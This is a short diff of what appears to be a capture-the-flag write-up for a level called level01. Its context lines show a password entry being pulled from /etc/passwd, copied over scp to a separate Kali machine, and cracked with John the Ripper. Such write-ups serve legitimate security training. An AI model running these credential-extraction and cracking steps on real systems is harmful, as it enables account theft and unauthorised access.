@@ -8,7 +8,9 @@ level01:~ $ grep flag01 /etc/passwd > /tmp/passwd
 level01:~ $ scp /tmp/passwd kali@kali:flag01pass
 ```
 
-The hash is a descrypt, traditional `crypt(3)` which is long obsolete and insecure
+The hash is a descrypt, traditional `crypt(3)` which is long obsolete and insecure.
+
+
 Crack hash with John-The-Ripper
 ```bash
 root@kali:~# john --show flag01pass
